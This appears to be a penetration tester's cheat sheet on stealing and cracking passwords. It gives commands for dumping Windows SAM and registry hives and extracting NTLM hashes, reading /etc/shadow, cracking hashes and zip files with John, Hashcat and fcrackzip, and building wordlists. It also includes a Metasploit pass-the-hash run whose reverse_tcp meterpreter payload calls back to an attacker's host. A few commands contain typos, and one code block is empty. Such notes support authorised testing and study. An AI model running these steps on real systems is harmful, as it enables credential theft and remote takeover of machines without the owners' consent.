# Passwords

## Obtaining Windows Passwords

Windows credentials may come from an Active Directory account or stored locally. Passwords are stored in two ways: The LAN Manager password hash and the NT password hash. They are often seen together separated by a colon and known as an NTLM hash pair. Neither are salted. LM hashes are limited to 14 characters.

### Finding Hashes

```bash
net user  # List user accounts
net user <user>  # Get more details of a specific user
```

Credentials are stored in the SAM database and we need to be an Administrator to see it.

```bash
# SAM file can be located in:
dir \windows\system32\config  # But not accessible while OS is running
# Values are also stored in the registry at:
HKEY_LOCAL_MACHINE\SAM
```

The SAM file is locked when the operating system is active. We will need to take a backup of the SAM file instead while the machine is active as well as the security file and the system file.

```bash
reg save hklm\sam sam.save
reg save hklm\security security.save
reg save hklm\system system.save
```

After copying the files over to Kali we can extract the hashes from the SAM database.

```bash
# Using samdump
samdump2 system.save sam.save
# Using pwdump
pwdump system.save same.save
# Using secrets dump from Impacket
python secretsdump.py -sam sam.save -system system.save LOCAL
```

If we have a Meterpreter session we can use the `hashdump` command to try to dump the hashes.

### Cracking Hashes

Now that we have a list of hashes we can place the hashes outputs into a file and then attempt to crack them using John The Ripper.

```bash
john myhash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=NT-old
```

Another tool we can use to find and crack hashes is Sam Inside (GUI).

### Passing Hashes

Pass-The-Hash is a different kind of authentication attack that allows us to use LM & NT hashes to gain access to a remote Windows host without having to know the actual password.

Example using Metasploit:

```bash
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > set LHOST <IP>
msf exploit(psexec) > set LPORT <PORT>
msf exploit(psexec) > set RHOST <IP>
msf exploit(psexec) > set SMBUser <username>
msf exploit(psexec) > set SMBPass <hash>
msf exploit(psexec) > exploit
```

## Obtaining Linux Passwords

### Finding Hashes

On a standard Linux system the user accounts are stored in the `/etc/passwd` file. There will be an 'x' where the password used to be but is now stored in the file `/etc/shadow`.&#x20;

```bash
cat /etc/passwd
cat /etc/shadow
```

### Cracking Hashes

We can combine the two files to extract the user and password information and then attempt to crack them using John The Ripper.

```bash
unsahdow passwd shadow > full.txt
john full.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## Password Cracking

### Cracking Hashes

#### Crackstation

[https://crackstation.net/](https://crackstation.net/)

#### JohnTheRipper

```bash
john linhash.txt --worlist=/usr/share/wordlists/rockyou.txt
john --show linhash.txt  # Show already cracked passwords for specific hashes
```

#### Hashcat

```bash
hashcat -m <mode> hash.txt wordlist.txt
```

### Cracking Files

#### Zip

```bash
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt file.zip
```

#### id\_rsa

```bash
```

### Other

#### Crunch

Crunch can create a wordlist based on criteria you specify. The output from crunch can be sent to the screen, file, or to another program.

```bash
crunch 10 10 -t password%%  # Generates list of 10 characters ending in 00-99
password00
...
password99

crunch 6 6 -t pass@@ -o pass.txt  # Generates list of 6 characters ending in aa-zz
passaa
...
passzz
```

#### CeWL

CeWL (Custom Word List generator) is a ruby app which spiders a given URL, up to a specified depth, and returns a list of words which can then be used for password crackers such as John the Ripper. Optionally, CeWL can follow external links.

CeWL can also create a list of email addresses found in mailto links. These email addresses can be used as usernames in brute force actions.

```bash
cewl <ip> -w meta.txt -d 3
```
